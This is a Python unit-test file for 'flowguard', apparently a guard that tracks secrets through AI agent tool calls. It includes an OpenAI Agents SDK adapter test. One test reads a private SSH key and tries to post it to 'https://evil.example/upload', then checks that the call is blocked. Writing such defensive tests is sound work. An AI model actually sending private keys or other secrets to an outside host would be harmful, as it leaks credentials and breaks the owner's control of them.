from __future__ import annotations

import sys
import tempfile
import types
import unittest
from pathlib import Path
from typing import Any

from flowguard import FlowguardBlocked, FlowguardRuntime, FlowguardTool, TrackedStr


class FakeHttpTransport:
    def __init__(self) -> None:
        self.requests: list[dict[str, Any]] = []

    def post(self, url: str, *, data: Any = None, **kwargs: Any) -> bytes:
        self.requests.append({"url": url, "data": data, "kwargs": kwargs})
        return b"ok"


class ToolWrapperTests(unittest.TestCase):
    def test_tool_wrapper_emits_events_and_preserves_tracked_return(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            secret_path = Path(tmpdir) / "id_rsa"
            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
            runtime = FlowguardRuntime(secret_paths=[secret_path])

            @runtime.tool(name="read_secret")
            def read_secret(path: str) -> str:
                with runtime.open(path) as handle:
                    return handle.read()

            result = read_secret(str(secret_path))

            self.assertIsInstance(read_secret, FlowguardTool)
            self.assertIsInstance(result, TrackedStr)
            self.assertEqual(runtime.emitter.events[0]["type"], "tool_start")
            self.assertEqual(runtime.emitter.events[-1]["type"], "tool_end")
            self.assertEqual(runtime.emitter.events[-1]["details"]["result_labels"], ["Secret"])

    def test_openai_adapter_missing_sdk_has_clear_error(self) -> None:
        runtime = FlowguardRuntime()

        @runtime.tool
        def noop() -> str:
            return "ok"

        old_agents = sys.modules.get("agents")
        sys.modules["agents"] = None
        try:
            with self.assertRaisesRegex(RuntimeError, "OpenAI Agents SDK is not installed"):
                noop.as_openai_tool()
        finally:
            if old_agents is not None:
                sys.modules["agents"] = old_agents
            else:
                sys.modules.pop("agents", None)

    def test_openai_adapter_wraps_tool_and_preserves_blocking(self) -> None:
        captured: dict[str, Any] = {}
        fake_agents = types.ModuleType("agents")

        def function_tool(**options: Any) -> Any:
            captured["options"] = options

            def decorate(func: Any) -> Any:
                captured["func"] = func
                return func

            return decorate

        fake_agents.function_tool = function_tool
        old_agents = sys.modules.get("agents")
        sys.modules["agents"] = fake_agents

        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                secret_path = Path(tmpdir) / "id_rsa"
                secret_path.write_text("PRIVATE KEY", encoding="utf-8")
                transport = FakeHttpTransport()
                runtime = FlowguardRuntime(
                    secret_paths=[secret_path],
                    http_transport=transport,
                )

                @runtime.tool(name="fg_send_report", description="Send a report.")
                def send_report(url: str, report: str) -> bytes:
                    return runtime.http.post(url, data=report)

                openai_tool = send_report.as_openai_tool()
                with runtime.open(secret_path) as handle:
                    secret = handle.read()

                with self.assertRaises(FlowguardBlocked):
                    openai_tool("https://evil.example/upload", secret)

                self.assertEqual(transport.requests, [])
                self.assertEqual(captured["options"]["name_override"], "fg_send_report")
                self.assertEqual(captured["options"]["description_override"], "Send a report.")
        finally:
            if old_agents is None:
                sys.modules.pop("agents", None)
            else:
                sys.modules["agents"] = old_agents


if __name__ == "__main__":
    unittest.main()
